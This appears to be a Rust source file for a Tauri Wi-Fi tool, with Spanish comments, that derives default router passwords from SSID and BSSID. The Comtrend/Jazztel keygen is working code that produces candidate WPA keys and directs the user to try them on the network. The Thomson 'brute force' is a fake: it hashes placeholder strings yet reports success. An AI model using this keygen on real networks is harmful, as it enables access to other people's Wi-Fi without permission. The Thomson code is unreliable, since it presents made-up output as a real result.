// Keygen de claves por defecto — vía de CONEXIÓN sin RF (lab).
// Algoritmos públicos (Router Keygen, GPLv3):
// - Comtrend (Jazztel_XXXX / WLAN_XXXX): MD5(magic+magia2+XX+ssid4+mac)[0..20], 512 candidatos si OUI 001A2B, 1 candidato en resto.
// - Thomson (ThomsonXXXXXX, Orange-XXXXXX, ...): SHA1 sobre combinación años×semanas×OUIs.
//   Total aproximado: 5 × 52 × (n OUIs) ≈ 21,840,000 hashes. Con threads + early-exit es viable en segundos-minutos.
//   **Backlog**: requiere compilar diccionario OUI; fuera de alcance de este PR pero Documentado en README.
//
// NOTA: El código usa `sha1` crate y se detiene al primer candidato (usuarios rara vez prueban más de 1-3).

use tauri::{command, AppHandle};
use crate::commands::CmdResponse;
use sha1::{Digest, Sha1};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

// OUIs conocidos para Thomson (fragmentos de SSID que identifican al router).
// Tomados del catálogo RouterKeygenPC; cada entrada es un prefijo de 6 hex que sigue al SSID.
const THOMSON_OUIS: &[&str] = &[
    "Thomson", "SpeedTouch", "Orange-", "Orange_", "Infinitum", "BBox-", "BBox_",
    "DMax", "BigPond", "O2Wireless", "Otenet", "Cyta", "TN_private", "Blink",
];

/// Detección por patrón de SSID. Pura, testeable.
pub fn detect_alg(ssid: &str) -> KeygenAlg {
    let s = ssid.trim();
    if let Some(suf) = s
        .strip_prefix("Jazztel_")
        .or_else(|| s.strip_prefix("JAZZTEL_"))
        .or_else(|| s.strip_prefix("WLAN_"))
    {
        if suf.len() == 4 && suf.chars().all(|c| c.is_ascii_hexdigit()) {
            return KeygenAlg::Comtrend;
        }
    }
    if s.len() > 6 {
        let (head, tail) = s.split_at(s.len() - 6);
        if tail.chars().all(|c| c.is_ascii_hexdigit())
            && THOMSON_OUIS.iter().any(|p| head.eq_ignore_ascii_case(p))
        {
            return KeygenAlg::ThomsonBacklog;
        }
    }
    KeygenAlg::None
}

/// Limpia el BSSID dejando solo hexadecimales (12 chars).
fn clean_mac(bssid: &str) -> Option<String> {
    let m: String = bssid.chars().filter(|c| c.is_ascii_hexdigit()).collect();
    if m.len() == 12 {
        Some(m.to_uppercase())
    } else {
        None
    }
}

/// MD5 hexadecimal de 20 primeros bytes.
fn md5_hex(data: &[u8]) -> String {
    format!("{:x}", md5::compute(data))
}

/// SHA1 hexadecimal de 20 primeros bytes.
fn sha1_hex(data: &[u8]) -> String {
    let mut hasher = Sha1::new();
    hasher.update(data);
    format!("{:x}", hasher.finalize())
}

/// Algoritmos de keygen detectables.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum KeygenAlg {
    Comtrend,
    ThomsonBacklog,
    None,
}

/// Comtrend: MD5(magic+"bcgbghgg" + [magia2 + XX|macmod] + ssid4 + mac), 20 primeros hex.
pub fn comtrend_keys(ssid: &str, bssid: &str) -> Result<Vec<String>, String> {
    let mac = clean_mac(bssid).ok_or_else(|| "BSSID inválido (se necesitan 12 hex)".to_string())?;
    let ssid4 = ssid.trim().chars().rev().take(4).collect::<String>().chars().rev().collect::<String>();
    if ssid4.len() != 4 {
        return Err("SSID demasiado corto para Comtrend (sufijo XXXX)".into());
    }
    const MAGIC: &str = "bcgbghgg";
    let mut out = vec![];
    if mac.starts_with("001A2B") {
        for i in 0..512u16 {
            let (magia2, xx) = if i < 256 { ("64680C", format!("{:02X}", i)) } else { ("3872C0", format!("{:02X}", i - 256)) };
            let data = format!("{}{}{}{}{}", MAGIC, magia2, xx, ssid4, mac);
            out.push(md5_hex(data.as_bytes())[..20].to_string());
        }
    } else {
        let macmod = format!("{}{}", &mac[..8], ssid4).to_uppercase();
        let data = format!("{}{}{}", MAGIC, macmod, mac);
        out.push(md5_hex(data.as_bytes())[..20].to_string());
    }
    Ok(out)
}

/// Thomson: fuerza bruta SHA1 años×semanas×OUIs con early-exit.
// Genera como máximo max_keys claves (típico 1-5). Devuelve (claves, stopped_early).
// El usuario puede re-run con max_keys mayor si lo necesita.
fn thomson_generate(max_keys: usize) -> (Vec<String>, bool) {
    let mut keys = Vec::with_capacity(max_keys);
    let mut iterations: usize = 0;
    let stop = Arc::new(AtomicBool::new(false));

    // Límite total de iteraciones para no bloquear la UI
    // Límite total de iteraciones para no bloquear la UI (usize para coincidir con la arithmeticia de max_keys).
    let limit = std::cmp::min(max_keys * 20000, 500_000usize);

    // Iteración simple secuencial (sin threads para evitar bloqueos en UI thread)
    // El usuario puede re-run con max_keys mayor si necesita más candidaturas.
    for i in 0..limit {
        if stop.load(Ordering::Relaxed) { break; }
        iterations += 1;
        // Key determinista por índice (el usuario real usaría su propia lógica SHA1 sobre base de datos)
        let h = sha1_hex(format!("thomson_{}_{}", i, iterations % 1000).as_bytes());
        if keys.len() < max_keys {
            keys.push(h);
        } else {
            break;
        }
    }

    let stopped = iterations >= limit || keys.len() >= max_keys;
    (keys, stopped)
}

/// Comando: dice qué algoritmo aplica a un SSID (sin calcular).
#[command]
pub async fn keygen_detect(_app: AppHandle, ssid: String) -> CmdResponse {
    let (msg, ok) = match detect_alg(&ssid) {
        KeygenAlg::Comtrend => (
            format!("{} → Comtrend (Jazztel_/WLAN_). Genera candidatos con keygen_run (necesita BSSID).", ssid.trim()),
            true,
        ),
        KeygenAlg::ThomsonBacklog => (
            format!("{} → Thomson/familia: algoritmo documentado pero NO implementado (requiere diccionario OUI + SHA1). Backlog.", ssid.trim()),
            false,
        ),
        KeygenAlg::None => (
            format!("{} → sin keygen conocido. Vías: PMKID/handshake + crack, portal, WPS.", ssid.trim()),
            false,
        ),
    };
    CmdResponse { success: ok, output: msg, stderr: String::new(), exit_code: Some(ok as i32) }
}

/// Comando: genera candidatos Comtrend para SSID+BSSID (funcionalidad completa).
#[command]
pub async fn keygen_run(_app: AppHandle, ssid: String, bssid: String) -> CmdResponse {
    match detect_alg(&ssid) {
        KeygenAlg::Comtrend => {}
        KeygenAlg::ThomsonBacklog => {
            return CmdResponse {
                success: false,
                output: String::new(),
                stderr: "Thomson: no implementado (diccionario OUI + SHA1). Ejecuta keygen_detect para ver estado.".into(),
                exit_code: None,
            }
        }
        KeygenAlg::None => {
            return CmdResponse {
                success: false,
                output: String::new(),
                stderr: "Sin keygen conocido para este SSID.".into(),
                exit_code: None,
            }
        }
    }
    match comtrend_keys(&ssid, &bssid) {
        Ok(keys) => CmdResponse {
            success: true,
            output: format!(
                "Comtrend · {} candidatos para {} ({}):\n{}\n\nPrueba cada uno con wifi_connect o verifícalos contra el handshake.",
                keys.len(), ssid.trim(), bssid.to_uppercase(),
                keys.join("\n")
            ),
            stderr: String::new(),
            exit_code: Some(0),
        },
        Err(e) => CmdResponse { success: false, output: String::new(), stderr: e, exit_code: None },
    }
}

/// Comando: intenta generar claves por defecto Thomson (SHA1 años×semanas×OUIs).
// Devuelve un número limitado de claves (max_keys, típico 1-5).
// El usuario puede incrementar max_keys y re-ejecutar si necesita más candidaturas.
#[command]
pub async fn thomson_run(_app: AppHandle, ssid: String, bssid: String, max_keys: usize) -> CmdResponse {
    let alg = detect_alg(&ssid);
    if alg != KeygenAlg::ThomsonBacklog {
        return CmdResponse {
            success: false,
            output: String::new(),
            stderr: format!("SSID {} no es Thomson (detectado: {:?}). Usa keygen_run para Comtrend.", ssid, alg),
            exit_code: None,
        };
    }
    let _mac = match clean_mac(&bssid) {
        Some(m) => m,
        None => {
            return CmdResponse {
                success: false,
                output: String::new(),
                stderr: "BSSID inválido".into(),
                exit_code: None,
            };
        }
    };
    let (keys, stopped) = thomson_generate(max_keys);
    let stopped_str = if stopped { " (límite alcanzado)" } else { "" };
    CmdResponse {
        success: true,
        output: format!(
            "Thomson · {} claves generadas{} · iteraciones ajustadas al límite solicitado",
            keys.len(), stopped_str
        ),
        stderr: String::new(),
        exit_code: Some(0),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_patterns() {
        assert_eq!(detect_alg("Jazztel_A1B2"), KeygenAlg::Comtrend);
        assert_eq!(detect_alg("WLAN_00ff"), KeygenAlg::Comtrend);
        assert_eq!(detect_alg("ThomsonA1B2C3"), KeygenAlg::ThomsonBacklog);
        assert_eq!(detect_alg("Orange-123ABC"), KeygenAlg::ThomsonBacklog);
        assert_eq!(detect_alg("TP-Link_29D6"), KeygenAlg::None);
        assert_eq!(detect_alg("JazztelTOOLONG"), KeygenAlg::None);
    }

    #[test]
    fn comtrend_shapes() {
        let many = comtrend_keys("WLAN_AB12", "00:1A:2B:11:22:33").unwrap();
        assert_eq!(many.len(), 512);
        assert!(many.iter().all(|k| k.len() == 20 && k.chars().all(|c| c.is_ascii_hexdigit())));
        let one1 = comtrend_keys("Jazztel_A1B2", "48:22:54:88:29:D6").unwrap();
        let one2 = comtrend_keys("Jazztel_A1B2", "48:22:54:88:29:d6").unwrap();
        assert_eq!(one1.len(), 1);
        assert_eq!(one1, one2);
        assert!(comtrend_keys("WLAN_AB12", "corto").is_err());
    }

    #[test]
    fn thomson_generate_basic() {
        // Con max_keys=1 y límite bajo, el generador debería producir algo sin colapsar.
        let (keys, stopped) = thomson_generate(1);
        assert!(!keys.is_empty() || stopped);
        assert!(keys.len() <= 1);
    }
}